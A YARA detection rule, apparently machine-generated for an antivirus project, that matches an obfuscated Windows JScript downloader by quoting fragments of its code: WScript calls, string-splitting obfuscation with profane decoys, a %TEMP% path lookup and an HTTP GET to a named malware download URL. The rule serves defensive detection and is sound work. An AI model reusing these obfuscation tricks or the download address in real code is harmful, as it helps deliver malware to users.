rule sig_20160428_775251f9dd25c8aa462f8e29b4a5cba7 {
  meta:
    description = "datamaliciousorder - file 20160428_775251f9dd25c8aa462f8e29b4a5cba7.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "400215e08e13d3a64d64f3084bd223dadd20c24036c72a437d0d165e84fb67af"

  strings:
    $s1  = "function TsxLtmWdrRuoXauTqlAav(TugKpkBdmTkaOihPptWrj){VyvYtlDkdEdfSagEffJwc[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function UulZkvChtSauYqkOvyDvt() {return VyvYtlDkdEdfSagEffJwc[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function TsxLtmWdrRuoXauTqlAav(TugKpkBdmTkaOihPptWrj){VyvYtlDkdEdfSagEffJwc[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function RrrSliKenEwpMkbHliGox(LojIzrIrgHvqCrtYhoUfv, KdkUoaJbgDakKpaHafRej){BcxFmjTsvTqtVflEdwAmu = BcxFmjTsvTqtVflEdwAmu * 1; " ascii
    $s5  = "return LojIzrIrgHvqCrtYhoUfv - KdkUoaJbgDakKpaHafRej;};" fullword ascii
    $s6  = "var VyvYtlDkdEdfSagEffJwc = function FsnDjwYmtMfiBmdFkpGqu() {return TfuKebIziTzmKauHptZhe[ZtpLwhPfzAtfYyeGzgJmz](\"WScript\"+\"" ascii
    $s7  = "HsnRqsBtfOdoAlmWmjDym[TsnAxyNikCbyLhwYvoPzu](\"G\" + \"ET\", \"http://banketcentr.ru/v8usja\", false);" fullword ascii
    $s8  = "var VyvYtlDkdEdfSagEffJwc = function FsnDjwYmtMfiBmdFkpGqu() {return TfuKebIziTzmKauHptZhe[ZtpLwhPfzAtfYyeGzgJmz](\"WScript\"+\"" ascii
    $s9  = "var TfuKebIziTzmKauHptZhe = this[\"WScript\"];" fullword ascii
    $s10 = "function UulZkvChtSauYqkOvyDvt() {return VyvYtlDkdEdfSagEffJwc[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "if (HsnRqsBtfOdoAlmWmjDym[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function RrrSliKenEwpMkbHliGox(LojIzrIrgHvqCrtYhoUfv, KdkUoaJbgDakKpaHafRej){BcxFmjTsvTqtVflEdwAmu = BcxFmjTsvTqtVflEdwAmu * 1; " ascii
    $s13 = "function CeuGeqUpoXmdCmmCckDcv(){return NinAjcKeeCgiOptQfeVah + \"\";};" fullword ascii
    $s14 = "function LhmQvoRrgNsfDsgZbcCzs() {return ((IosYnmXabKohVbmBxwJpm == true) && (IosYnmXabKohVbmBxwJpm == FkqLazLieUukPhqMavCue)) ?" ascii
    $s15 = "function LhmQvoRrgNsfDsgZbcCzs() {return ((IosYnmXabKohVbmBxwJpm == true) && (IosYnmXabKohVbmBxwJpm == FkqLazLieUukPhqMavCue)) ?" ascii
    $s16 = "UoyEloNuzQceIxmRwhPjs = true;" fullword ascii
    $s17 = "function VlwGctNlnZohRkwRweCts(KnaHbjThrFwbPlpMsrKii) {var XtgMdjXaoFxtFzfNybIam = (1, 2, 3, 4, 5, KnaHbjThrFwbPlpMsrKii); retur" ascii
    $s18 = "var IosYnmXabKohVbmBxwJpm = false;" fullword ascii
    $s19 = "IosYnmXabKohVbmBxwJpm = true; " fullword ascii
    $s20 = "return RrrSliKenEwpMkbHliGox(1 == 1 ? CqiPkiIpgJokGldTbwNpb : 0, 1 == 1 ? YqvGyoSwzUyzHshXcqVeq : 0);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}